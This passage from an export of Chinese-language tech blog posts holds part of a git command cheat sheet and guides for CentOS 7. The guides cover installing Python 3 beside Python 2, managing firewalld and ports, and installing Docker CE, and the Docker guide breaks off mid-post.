[file2] ... -m [message]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 提交工作区自上次commit之后的变化，直接到仓库区</code></p>\n\n\t\t\t<p><code>$ git commit -a</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 提交时显示所有diff信息</code></p>\n\n\t\t\t<p><code>$ git commit -v</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 使用一次新的commit，替代上一次提交</code></p>\n\n\t\t\t<p><code># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</code></p>\n\n\t\t\t<p><code>$ git commit --amend -m [message]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 重做上一次commit，并包括指定文件的新变化</code></p>\n\n\t\t\t<p><code>$ git commit --amend [file1] [file2] ...</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>　　</p>\n\n<p>五、分支</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\n\t\t\t<p>29</p>\n\n\t\t\t<p>30</p>\n\n\t\t\t<p>31</p>\n\n\t\t\t<p>32</p>\n\n\t\t\t<p>33</p>\n\n\t\t\t<p>34</p>\n\n\t\t\t<p>35</p>\n\n\t\t\t<p>36</p>\n\n\t\t\t<p>37</p>\n\n\t\t\t<p>38</p>\n\n\t\t\t<p>39</p>\n\n\t\t\t<p>40</p>\n\n\t\t\t<p>41</p>\n\n\t\t\t<p>42</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code># 列出所有本地分支</code></p>\n\n\t\t\t<p><code>$ git branch</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 列出所有远程分支</code></p>\n\n\t\t\t<p><code>$ git branch -r</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 列出所有本地分支和远程分支</code></p>\n\n\t\t\t<p><code>$ git branch -a</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 新建一个分支，但依然停留在当前分支</code></p>\n\n\t\t\t<p><code>$ git branch [branch-name]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 新建一个分支，并切换到该分支</code></p>\n\n\t\t\t<p><code>$ git checkout -b [branch]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 新建一个分支，指向指定commit</code></p>\n\n\t\t\t<p><code>$ git branch [branch] [commit]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 新建一个分支，与指定的远程分支建立追踪关系</code></p>\n\n\t\t\t<p><code>$ git branch --track [branch] [remote-branch]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 切换到指定分支，并更新工作区</code></p>\n\n\t\t\t<p><code>$ git checkout [branch-name]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 切换到上一个分支</code></p>\n\n\t\t\t<p><code>$ git checkout -</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 建立追踪关系，在现有分支与指定的远程分支之间</code></p>\n\n\t\t\t<p><code>$ git branch --</code><code>set</code><code>-upstream [branch] [remote-branch]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 合并指定分支到当前分支</code></p>\n\n\t\t\t<p><code>$ git merge [branch]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 选择一个commit，合并进当前分支</code></p>\n\n\t\t\t<p><code>$ git cherry-pick [commit]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 删除分支</code></p>\n\n\t\t\t<p><code>$ git branch -d [branch-name]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 删除远程分支</code></p>\n\n\t\t\t<p><code>$ git push origin --delete [branch-name]</code></p>\n\n\t\t\t<p><code>$ git branch -dr [remote/branch]</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>　　</p>\n\n<p>六、标签</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code># 列出所有tag</code></p>\n\n\t\t\t<p><code>$ git tag</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 新建一个tag在当前commit</code></p>\n\n\t\t\t<p><code>$ git tag [tag]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 新建一个tag在指定commit</code></p>\n\n\t\t\t<p><code>$ git tag [tag] [commit]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 删除本地tag</code></p>\n\n\t\t\t<p><code>$ git tag -d [tag]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 删除远程tag</code></p>\n\n\t\t\t<p><code>$ git push origin :refs/tags/[tagName]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 查看tag信息</code></p>\n\n\t\t\t<p><code>$ git show [tag]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 提交指定tag</code></p>\n\n\t\t\t<p><code>$ git push [remote] [tag]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 提交所有tag</code></p>\n\n\t\t\t<p><code>$ git push [remote] --tags</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 新建一个分支，指向某个tag</code></p>\n\n\t\t\t<p><code>$ git checkout -b [branch] [tag]</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>　　</p>\n\n<p>七、查看信息</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\n\t\t\t<p>29</p>\n\n\t\t\t<p>30</p>\n\n\t\t\t<p>31</p>\n\n\t\t\t<p>32</p>\n\n\t\t\t<p>33</p>\n\n\t\t\t<p>34</p>\n\n\t\t\t<p>35</p>\n\n\t\t\t<p>36</p>\n\n\t\t\t<p>37</p>\n\n\t\t\t<p>38</p>\n\n\t\t\t<p>39</p>\n\n\t\t\t<p>40</p>\n\n\t\t\t<p>41</p>\n\n\t\t\t<p>42</p>\n\n\t\t\t<p>43</p>\n\n\t\t\t<p>44</p>\n\n\t\t\t<p>45</p>\n\n\t\t\t<p>46</p>\n\n\t\t\t<p>47</p>\n\n\t\t\t<p>48</p>\n\n\t\t\t<p>49</p>\n\n\t\t\t<p>50</p>\n\n\t\t\t<p>51</p>\n\n\t\t\t<p>52</p>\n\n\t\t\t<p>53</p>\n\n\t\t\t<p>54</p>\n\n\t\t\t<p>55</p>\n\n\t\t\t<p>56</p>\n\n\t\t\t<p>57</p>\n\n\t\t\t<p>58</p>\n\n\t\t\t<p>59</p>\n\n\t\t\t<p>60</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code># 显示有变更的文件</code></p>\n\n\t\t\t<p><code>$ git status</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示当前分支的版本历史</code></p>\n\n\t\t\t<p><code>$ git log</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示commit历史，以及每次commit发生变更的文件</code></p>\n\n\t\t\t<p><code>$ git log --stat</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 搜索提交历史，根据关键词</code></p>\n\n\t\t\t<p><code>$ git log -S [keyword]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示某个commit之后的所有变动，每个commit占据一行</code></p>\n\n\t\t\t<p><code>$ git log [tag] HEAD --pretty=format:%s</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示某个commit之后的所有变动，其\"提交说明\"必须符合搜索条件</code></p>\n\n\t\t\t<p><code>$ git log [tag] HEAD --grep feature</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示某个文件的版本历史，包括文件改名</code></p>\n\n\t\t\t<p><code>$ git log --follow [file]</code></p>\n\n\t\t\t<p><code>$ git whatchanged [file]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示指定文件相关的每一次diff</code></p>\n\n\t\t\t<p><code>$ git log -p [file]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示过去5次提交</code></p>\n\n\t\t\t<p><code>$ git log -5 --pretty --oneline</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示所有提交过的用户，按提交次数排序</code></p>\n\n\t\t\t<p><code>$ git shortlog -sn</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示指定文件是什么人在什么时间修改过</code></p>\n\n\t\t\t<p><code>$ git blame [file]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示暂存区和工作区的差异</code></p>\n\n\t\t\t<p><code>$ git diff</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示暂存区和上一个commit的差异</code></p>\n\n\t\t\t<p><code>$ git diff --cached [file]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示工作区与当前分支最新commit之间的差异</code></p>\n\n\t\t\t<p><code>$ git diff HEAD</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示两次提交之间的差异</code></p>\n\n\t\t\t<p><code>$ git diff [first-branch]...[second-branch]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示今天你写了多少行代码</code></p>\n\n\t\t\t<p><code>$ git diff --shortstat </code><code>\"@{0 day ago}\"</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示某次提交的元数据和内容变化</code></p>\n\n\t\t\t<p><code>$ git show [commit]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示某次提交发生变化的文件</code></p>\n\n\t\t\t<p><code>$ git show --name-only [commit]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示某次提交时，某个文件的内容</code></p>\n\n\t\t\t<p><code>$ git show [commit]:[filename]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示当前分支的最近几次提交</code></p>\n\n\t\t\t<p><code>$ git reflog</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>八、远程同步</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code># 下载远程仓库的所有变动</code></p>\n\n\t\t\t<p><code>$ git fetch [remote]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示所有远程仓库</code></p>\n\n\t\t\t<p><code>$ git remote -v</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 显示某个远程仓库的信息</code></p>\n\n\t\t\t<p><code>$ git remote show [remote]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 增加一个新的远程仓库，并命名</code></p>\n\n\t\t\t<p><code>$ git remote add [shortname] [url]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 取回远程仓库的变化，并与本地分支合并</code></p>\n\n\t\t\t<p><code>$ git pull [remote] [branch]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 上传本地指定分支到远程仓库</code></p>\n\n\t\t\t<p><code>$ git push [remote] [branch]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 强行推送当前分支到远程仓库，即使有冲突</code></p>\n\n\t\t\t<p><code>$ git push [remote] --force</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 推送所有分支到远程仓库</code></p>\n\n\t\t\t<p><code>$ git push [remote] --all</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>九、撤销</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\n\t\t\t<p>5</p>\n\n\t\t\t<p>6</p>\n\n\t\t\t<p>7</p>\n\n\t\t\t<p>8</p>\n\n\t\t\t<p>9</p>\n\n\t\t\t<p>10</p>\n\n\t\t\t<p>11</p>\n\n\t\t\t<p>12</p>\n\n\t\t\t<p>13</p>\n\n\t\t\t<p>14</p>\n\n\t\t\t<p>15</p>\n\n\t\t\t<p>16</p>\n\n\t\t\t<p>17</p>\n\n\t\t\t<p>18</p>\n\n\t\t\t<p>19</p>\n\n\t\t\t<p>20</p>\n\n\t\t\t<p>21</p>\n\n\t\t\t<p>22</p>\n\n\t\t\t<p>23</p>\n\n\t\t\t<p>24</p>\n\n\t\t\t<p>25</p>\n\n\t\t\t<p>26</p>\n\n\t\t\t<p>27</p>\n\n\t\t\t<p>28</p>\n\n\t\t\t<p>29</p>\n\n\t\t\t<p>30</p>\n\n\t\t\t<p>31</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code># 恢复暂存区的指定文件到工作区</code></p>\n\n\t\t\t<p><code>$ git checkout [file]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 恢复某个commit的指定文件到暂存区和工作区</code></p>\n\n\t\t\t<p><code>$ git checkout [commit] [file]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 恢复暂存区的所有文件到工作区</code></p>\n\n\t\t\t<p><code>$ git checkout .</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</code></p>\n\n\t\t\t<p><code>$ git reset [file]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 重置暂存区与工作区，与上一次commit保持一致</code></p>\n\n\t\t\t<p><code>$ git reset --hard</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</code></p>\n\n\t\t\t<p><code>$ git reset [commit]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</code></p>\n\n\t\t\t<p><code>$ git reset --hard [commit]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</code></p>\n\n\t\t\t<p><code>$ git reset --keep [commit]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 新建一个commit，用来撤销指定commit</code></p>\n\n\t\t\t<p><code># 后者的所有变化都将被前者抵消，并且应用到当前分支</code></p>\n\n\t\t\t<p><code>$ git revert [commit]</code></p>\n\n\t\t\t<p> </p>\n\n\t\t\t<p><code># 暂时将未提交的变化移除，稍后再移入</code></p>\n\n\t\t\t<p><code>$ git stash</code></p>\n\n\t\t\t<p><code>$ git stash pop</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p>　　</p>\n\n<p> </p>\n\n<p>转载链接：http://www.imooc.com/article/20411</p>\n                                    </div>", "log_PostTime": 1584891081, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7安装Python3详细步骤与Python2共用方法", "log_Intro": "CentOS7安装Python3详细步骤与Python2共用方法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>本人使用的是centos7，该系统已经自带了python2，但是由于python3和python2在很多使用上还存在着较大区别，并且本着学习的态度决定尝试安装一次。</p>\n\n<p>由于一开始忘了截图，所以本文只有所有的安装命令，命令完全正确，亲测可以使用，所以在此发文记录一下。</p>\n\n<p>说明：python2和python3各有特点，目前很多库支持较多的还是python2，站在学习的角度，建议大家两个版本都保留着。</p>\n\n<p>输入Python命令，查看可以得知我的本机是Python2.7.5版本</p>\n\n<p>[root@localhost ~]# python<br>\nPython 2.7.5 (default, Aug  7 2019, 00:51:29) <br>\n[GCC 4.8.5 20150623 (Red Hat 4.8.5-39)] on linux2<br>\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.<br>\n&gt;&gt;&gt; </p>\n\n<p>输入which python</p>\n\n<p>可以查看位置，一般是位于/usr/bin/python目录下。</p>\n\n<p>下面介绍安装Python3的方法：</p>\n\n<p>注意：以下所有命令请单条执行</p>\n\n<p>1、首先安装依赖包</p>\n\n<pre class=\"has\">\n<code> yum -y groupinstall \"Development tools\"</code></pre>\n\n<pre class=\"has\">\n<code>yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel</code></pre>\n\n<pre class=\"has\">\n<code>yum install libffi-devel\n</code></pre>\n\n<p>2、建立一个空文件夹（个人可以根据自己的情况安装在不同的位置）,并进入该目录</p>\n\n<p>  mkdir /usr/local/python3</p>\n\n<p>  cd /usr/local/python3</p>\n\n<p>3、根据自己需求下载不同版本的Python3，我下载的是Python3.7.6</p>\n\n<p> wget <a href=\"https://www.python.org/ftp/python/3.7.6/Python-3.7.6.tar.xz\" rel=\"nofollow\">https://www.python.org/ftp/python/3.7.6/Python-3.7.6.tar.xz</a><br>\n4、解压压缩包，会发现在该目录新生成了一个目录叫Python-3.7.6，然后安装Python3</p>\n\n<pre class=\"has\">\n<code>tar -xvJf  Python-3.7.6.tar.xz\ncd Python-3.7.6\n./configure --prefix=/usr/local/python3\nmake &amp;&amp; make install</code></pre>\n\n<p><br>\n5、最后创建软链接</p>\n\n<pre class=\"has\">\n<code>ln -s /usr/local/python3/bin/python3 /usr/bin/python3\nln -s /usr/local/python3/bin/pip3 /usr/bin/pip3</code></pre>\n\n<p><br>\n6、在命令行中输入python3测试</p>\n\n<p>[root@localhost ~]# python3<br>\nPython 3.7.6 (default, Jan  1 2020, 13:17:10) <br>\n[GCC 4.8.5 20150623 (Red Hat 4.8.5-39)] on linux<br>\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.<br>\n&gt;&gt;&gt; <br>\n </p>\n\n<p> </p>\n\n<p>同样的，我们的python2版本也仍旧在：</p>\n\n<p>[root@localhost ~]# python<br>\nPython 2.7.5 (default, Aug  7 2019, 00:51:29) <br>\n[GCC 4.8.5 20150623 (Red Hat 4.8.5-39)] on linux2<br>\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.<br>\n&gt;&gt;&gt; <br>\n </p>\n\n<p>当我们需要使用不同的python版本的时候，就可以通过命令行输入python2或者python3来开启相应的版本。<br>\n </p>\n                                    </div>", "log_PostTime": 1584891083, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "CentOS7在防火墙开启与关闭以及端口操作", "log_Intro": "CentOS7在防火墙开启与关闭以及端口操作", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>CentOS7在安装软件包或类库的时候，常常会因为防火墙的拦截和端口未开放导致连接失败，数据调用或远程失败等，所以在使用CentOS时需学会对防火墙和端口操作。。。</p>\n\n<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=1\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=ae68be76a2773912c4268561c8188675/f603918fa0ec08fa0956eb6c52ee3d6d54fbdaa3.jpg\"></a></p>\n\n<h2>工具/原料</h2>\n\n<p>已安装CentOS7的主机一部</p>\n\n<h2>方法/步骤</h2>\n\n<ol><li>\n\t<p>CentOS7使用systemctl指令来管理系统的单一服务，在CentOS7中对于firewalld（防火墙）服务的开启、关闭、状态查询也同样是使用该指令，操作如下：</p>\n\t</li>\n\t<li>\n\t<p>启动防火墙： systemctl start firewalld</p>\n\t</li>\n\t<li>\n\t<p>查看防火墙状态： systemctl status firewalld </p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=2\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=d0627d708cd6277fe912323818391f63/472309f790529822256dd008dcca7bcb0b46d49b.jpg\"></a></p>\n\t</li>\n\t<li>\n\t<p>关闭防火墙： systemctl stop firewalld</p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=3\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=5b73f4c31430e924cfa49c317c096e66/0df3d7ca7bcb0a46ae6462f26063f6246a60afb3.jpg\"></a></p>\n\t</li>\n\t<li>\n\t<p>开机时启用防火墙服务：systemctl enable firewalld开机时禁用防火墙服务：systemctl disable firewalld</p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=4\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=f087d108dcca7bcb7d7bc72f8e086b3f/cb8065380cd7912315547cbfa6345982b3b78041.jpg\"></a></p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=5\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=9a5b34ab3e2ac65c67056673cbf0b21d/4ec2d5628535e5dd47cd4d147dc6a7efcf1b621c.jpg\"></a></p>\n\t</li>\n\t<li>\n\t<p>查询防火墙服务是否开机启动：systemctl is-enabled firewalld</p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=6\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=ce3122f89945d688a302b2a494c07dab/faedab64034f78f0fafa713872310a55b2191c03.jpg\"></a></p>\n\t</li>\n\t<li>\n\t<p>查询已经启动的服务列表：systemctl list-unit-files|grep enabled</p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=7\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=5e7ff5353dd3d539c13d0fc30a86e927/7aec54e736d12f2e2ead7bab44c2d56284356855.jpg\"></a></p>\n\t</li>\n\t<li>\n\t<p>查询启动失败的服务列表：systemctl --failed</p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=8\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=56767d79da58ccbf1bbcb53a29dabcd4/d788d43f8794a4c298b633e005f41bd5ac6e3960.jpg\"></a></p>\n\t</li>\n\t<li>\n\t<p>在安装软件或列库时，除了直接开启和关闭防火墙，也可以通过对端口的操作直接开放连接；添加端口：firewall-cmd --zone=public --add-port=80/tcp --permanent </p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=9\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=65ba1525bf8f8c54e3d3c52f0a2b2dee/94cad1c8a786c917b5d581f2c23d70cf3ac75723.jpg\"></a></p>\n\t</li>\n\t<li>\n\t<p>更新防火墙规则：firewall-cmd --reload</p>\n\n\t<p>查看端口状态：firewall-cmd --zone=public --query-port=80/tcp</p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=10\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=5a6a2ce842540923aa69637ea25ad1dc/738b4710b912c8fc14152406f7039245d7882113.jpg\"></a></p>\n\t</li>\n\t<li>\n\t<p>删除开放的端口：firewall-cmd --zone=public --remove-port=80/tcp --permanent</p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=11\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=c09714f89945d688a302b2a494c37dab/faedab64034f78f0f45c473872310a55b2191ca1.jpg\"></a></p>\n\t</li>\n\t<li>\n\t<p>每次都更新防火墙规则，都需要重新更新：firewall-cmd --reload，更新状态；</p>\n\t</li>\n\t<li>\n\t<p>此外，在更新完防火墙的设置后，也可以查看所有开启的端口：firewall-cmd --zone=public --list-ports</p>\n\n\t<p><a href=\"http://jingyan.baidu.com/album/cdddd41cb3bf6c53cb00e1ac.html?picindex=12\" rel=\"nofollow\"><img alt=\"CentOS7在防火墙与端口上的操作\" class=\"has\" src=\"https://imgsa.baidu.com/exp/w=500/sign=73f7e10f3aadcbef01347e069cae2e0e/e1fe9925bc315c6097fdb32486b1cb1348547795.jpg\"></a></p>\n\t</li>\n</ol>                                    </div>", "log_PostTime": 1584891084, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "linux CentOS7 下 Docker安装", "log_Intro": "linux CentOS7 下 Docker安装", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>Docker在CentOS安装介绍地址：https://docs.docker.com/install/linux/docker-ce/centos/</p>\n\n<p>使用root权限安装的。</p>\n\n<p>1.安装所需的包。</p>\n\n<p>$ sudo yum install -y yum-utils \\<br>\n  device-mapper-persistent-data \\<br>\n  lvm2<br>\n2.设置存储库。</p>\n\n<p>$ sudo yum-config-manager \\<br>\n    --add-repo \\<br>\n    https://download.docker.com/linux/centos/docker-ce.repo<br>\n3.安装docker ce。</p>\n\n<p>//不指定版本号则安装最新版本<br>\n$ sudo yum install docker-ce docker-ce-cli containerd.io -y<br>\n//安装指定版本，<br>\n//需要查看可以安装的版本<br>\n$ yum list docker-ce --showduplicates | sort -r<br>\n//然后带上版本号即可<br>\n$ sudo yum install docker-ce-&lt;VERSION_STRING&gt; docker-ce-cli-&lt;VERSION_STRING&gt; containerd.io<br>\n4.测试，安装成功的话会输出系统以及docker的一些基本信息，如内核、内存等。</p>\n\n<p>//启动docker<br>\n$ sudo systemctl start docker<br>\n//测试<br>\n$ docker info 